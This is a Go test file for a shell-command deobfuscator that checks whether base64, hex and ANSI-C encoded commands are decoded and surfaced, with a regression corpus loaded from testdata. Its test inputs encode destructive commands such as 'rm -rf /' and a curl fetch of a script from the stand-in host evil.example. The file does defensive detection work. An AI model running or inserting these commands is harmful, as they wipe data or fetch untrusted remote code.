package shell

import (
	"bufio"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestDeobfuscateDecoders(t *testing.T) {
	cases := []struct {
		name  string
		in    string
		want  string
		layer string
	}{
		{"base64_std", "echo cm0gLXJmIC8= | base64 -d", "rm -rf /", "base64"},
		{"base64_curl", "Y3VybCBodHRwOi8vZXZpbC5leGFtcGxlL3guc2g=", "curl http://evil.example/x.sh", "base64"},
		{"hex_blob", "726d202d7266202f746d702f78", "rm -rf /tmp/x", "hex"},
		{"hex_escapes", `printf '\x72\x6d\x20\x2d\x72\x66'`, "rm -rf", "hex"},
		{"ansi_c_hex", `$'\x72\x6d'`, "rm", "ansi-c"},
		{"ansi_c_octal", `$'\162\155'`, "rm", "ansi-c"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			out, meta := Deobfuscate(tc.in)
			if !strings.Contains(out, tc.want) {
				t.Fatalf("out %q missing %q", out, tc.want)
			}
			if !containsString(meta.Layers, tc.layer) {
				t.Fatalf("layers %v missing %q", meta.Layers, tc.layer)
			}
			if meta.Depth < 1 {
				t.Fatalf("depth = %d, want >= 1", meta.Depth)
			}
		})
	}
}

func TestDeobfuscateNestedDepth(t *testing.T) {
	// Double-base64 encoded "rm -rf /" needs two decode rounds.
	out, meta := Deobfuscate("Y20wZ0xYSm1JQzg9")
	if !strings.Contains(out, "rm -rf /") {
		t.Fatalf("nested decode failed: %q", out)
	}
	if meta.Depth < 2 {
		t.Fatalf("depth = %d, want >= 2", meta.Depth)
	}
}

func TestDeobfuscateOversizeInputPassthrough(t *testing.T) {
	big := strings.Repeat("A", maxInputBytes+1)
	out, meta := Deobfuscate(big)
	if out != big || meta.Depth != 0 {
		t.Fatalf("oversize input should pass through untouched")
	}
}

func TestDeobfuscateNonUTF8Passthrough(t *testing.T) {
	in := "echo \xff\xfe"
	out, meta := Deobfuscate(in)
	if out != in || meta.Depth != 0 {
		t.Fatalf("non-utf8 input should pass through untouched")
	}
}

func TestDeobfuscatePlainCommandUnchanged(t *testing.T) {
	in := "git status"
	out, meta := Deobfuscate(in)
	if out != in || meta.Depth != 0 {
		t.Fatalf("plain command should not be decoded: out=%q depth=%d", out, meta.Depth)
	}
}

func TestDeobfuscateDepthCap(t *testing.T) {
	// Even a pathological input cannot exceed maxDecodeDepth rounds.
	_, meta := Deobfuscate("Y20wZ0xYSm1JQzg9 726d202d7266202f746d702f78")
	if meta.Depth > maxDecodeDepth {
		t.Fatalf("depth = %d exceeds cap %d", meta.Depth, maxDecodeDepth)
	}
}

// TestObfuscationCorpus loads every case in testdata/obfuscation and asserts the
// static decoder surfaces the expected payload substring. This is the regression
// corpus required by the phase spec (>= 10 cases).
func TestObfuscationCorpus(t *testing.T) {
	dir := filepath.Join("testdata", "obfuscation")
	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Fatalf("read corpus dir: %v", err)
	}
	count := 0
	for _, e := range entries {
		if e.IsDir() || !strings.HasSuffix(e.Name(), ".txt") {
			continue
		}
		count++
		name := e.Name()
		t.Run(name, func(t *testing.T) {
			expect, command := loadCorpusCase(t, filepath.Join(dir, name))
			out, _ := Deobfuscate(command)
			// The deobfuscated string must reveal the hidden payload, OR the
			// parsed IR (nested unwrap) must surface it.
			if strings.Contains(out, expect) {
				return
			}
			ir, _, _ := Prepare(command)
			if irContains(ir, expect) {
				return
			}
			t.Fatalf("case %s: payload %q not surfaced.\ndeob=%q", name, expect, out)
		})
	}
	if count < 10 {
		t.Fatalf("corpus has %d cases, want >= 10", count)
	}
}

func loadCorpusCase(t *testing.T, path string) (expect, command string) {
	t.Helper()
	f, err := os.Open(path)
	if err != nil {
		t.Fatalf("open %s: %v", path, err)
	}
	defer f.Close()

	var lines []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.HasPrefix(line, "# expect:") {
			expect = strings.TrimSpace(strings.TrimPrefix(line, "# expect:"))
			continue
		}
		if strings.TrimSpace(line) == "" {
			continue
		}
		lines = append(lines, line)
	}
	if err := scanner.Err(); err != nil {
		t.Fatalf("scan %s: %v", path, err)
	}
	if expect == "" {
		t.Fatalf("case %s missing '# expect:' header", path)
	}
	return expect, strings.Join(lines, "\n")
}

func irContains(ir IR, sub string) bool {
	if strings.Contains(ir.Raw, sub) {
		return true
	}
	for _, s := range ir.Stages {
		if strings.Contains(s.Argv0, sub) {
			return true
		}
		if anyContains(s.Args, sub) {
			return true
		}
	}
	if anyContains(ir.Substitutions, sub) {
		return true
	}
	for _, n := range ir.NestedCommands {
		if irContains(n, sub) {
			return true
		}
	}
	return false
}
